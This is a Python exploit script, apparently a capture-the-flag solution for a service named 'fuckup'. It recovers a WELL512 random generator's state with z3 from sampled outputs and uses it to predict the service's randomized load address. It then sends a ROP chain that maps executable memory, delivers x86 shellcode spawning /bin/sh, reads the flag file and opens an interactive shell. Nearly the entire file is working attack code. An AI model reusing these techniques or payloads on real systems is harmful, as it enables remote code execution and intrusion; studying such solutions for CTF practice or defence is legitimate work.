import sys, os
import struct
import socket
import time
import subprocess

R = 16

def MAT0POS(t,v):
	return (v^(v>>t)) & 0xffffffff
def MAT0NEG(t,v):
	return (v^(v<<(-(t)))) & 0xffffffff
def MAT3NEG(t,v):
	return (v<<(-(t))) & 0xffffffff
def MAT4NEG(t,b,v):
	return (v ^ ((v<<(-(t))) & b)) & 0xffffffff

state_i = 15
STATE = [0]*R

def V0():
	global STATE, state_i
	return STATE[state_i]
def VM1():
	global STATE, state_i
	return STATE[(state_i+13) & 0x0000000f]
def VM2():
	global STATE, state_i
	return STATE[(state_i+9) & 0x0000000f]
def VRm1():
	global STATE, state_i
	return STATE[(state_i+15) & 0x0000000f]

def WELLRNG512a():
  global STATE, state_i
  z0    = VRm1()
  z1    = MAT0NEG (-16,V0())    ^ MAT0NEG (-15, VM1())
  z2    = MAT0POS (11, VM2())
  STATE[(state_i+10) & 0xf] = (z1                  ^ z2) & 0xffffffff
  STATE[(state_i+15) & 0xf] = (MAT0NEG (-2,z0)     ^ MAT0NEG(-18,z1)    ^ MAT3NEG(-28,z2) ^ MAT4NEG(-5,0xda442d24,STATE[(state_i+10)&0xf])) & 0xffffffff
  state_i = (state_i + 15) & 0x0000000f;
  return STATE[state_i];

mmap = 0x8754-0x8000
Rop2 = 0xa5a0-0x8000
recv = 0x8360-0x8000

shellcode = ("SVWU\x8b\xec\x8dd$\xf8\xe8\x00\x00\x00\x00_\x8d\x7f\xf13\xf6\x83\xfe\x03|\x02"
	"\xeb\x11j?Xj\x04[\x8b\xce\xcd\x80\x8b\xc6\x83\xc6\x01\xeb\xe8\x8dGL\x89E"
	"\xf8j\x00\x8fE\xfc\x8bU\xf8\x8dM\xf8j\x0bX\x8b\xda3\xd2\xcd\x80\xc9_^[\xc3"
	"/bin/sh\x00")

s = socket.create_connection((sys.argv[1], 2000))
print "Getting Randoms"

RandomVals = ""
time.sleep(0.5)
s.recv(4096)
for i in xrange(0, 15):
	s.send("3\n")
	time.sleep(0.5)
	Data = s.recv(4096).split("\n")[0].split(" ")
	if i >= 4:
		RandomVals += Data[2].strip() + ","
	
StartValues = RandomVals[0:-1]

RandomVals = ""
for i in xrange(0, 17):
	s.send("3\n")
	time.sleep(0.5)
	Data = s.recv(4096).split("\n")[0].split(" ")
	RandomVals += Data[2].strip() + ","

Values = RandomVals[0:-1]

print "Generating SMT"
output = subprocess.check_output(["python","gen-well512.py",StartValues,Values])

try:
	os.unlink("temp.smt")
except:
	pass

f = open("temp.smt","w")
f.write(output)
f.close()

print "Processing SMT with z3"
z3output = subprocess.check_output(["/Users/Lightning/z3/build/z3","-smt2","temp.smt"])

print "Recreating random state"
z3output = z3output.split("\n")
z3output.pop(0)
z3output.pop(0)
z3output.pop()
z3output.pop()

STATEVAL = [0]*16
for i in xrange(0, len(z3output), 2):
	StateID = z3output[i].strip().split(" ")[1].split("_")
	StateIDCur = int(StateID[1])
	StateID = int(StateID[0][5:])
	if StateIDCur > STATEVAL[StateID]:
		STATEVAL[StateID] = StateIDCur
		STATE[StateID] = int(z3output[i+1].strip()[2:-1],16)

for i in xrange(0, len(STATE)):
	print "Our STATE[%02d]: %08x" % (i, STATE[i])

#advance our random ahead for how many bytes we need to send
for i in xrange(0, 100):
	WELLRNG512a()

Addr = WELLRNG512a() & 0xfffff000
print "Calculated address: %08x" % (Addr)

ROP = [mmap+Addr, Rop2+Addr, 0x11220000, 0x1000, 7, 0x22, 0xffffffff, 0]
ROP += [recv+Addr, 0x11220000, 0x11220000, len(shellcode)]

OutData = struct.pack("<" + "I"*len(ROP), *ROP)
OutData = "1"*22 + OutData
OutData += "1"*(100-len(OutData))

s.send("4\n")
s.send(OutData)
print s.recv(4096)

time.sleep(0.5)
s.send(shellcode)

time.sleep(0.5)
s.recv(4096)

print "Incoming shell"

s.send("cat /home/fuckup/flag\n")
time.sleep(0.5)
print s.recv(4096)
s.close()
sys.exit(0)

# Awesome Shell shamelessly stolen from Eindbazen
# connect stdio to socket until either EOF's. use low-level calls to bypass stdin buffering.
# also change the tty to character mode so we can have line editing and tab completion.
import termios, tty, select, os
old_settings = termios.tcgetattr(0)
try:
    tty.setcbreak(0)
    c = True
    while c:
        for i in select.select([0, s.fileno()], [], [], 0)[0]:
            c = os.read(i, 1024)
            if c: os.write(s.fileno() if i == 0 else 1, c)
except KeyboardInterrupt: pass
finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)

s.close()

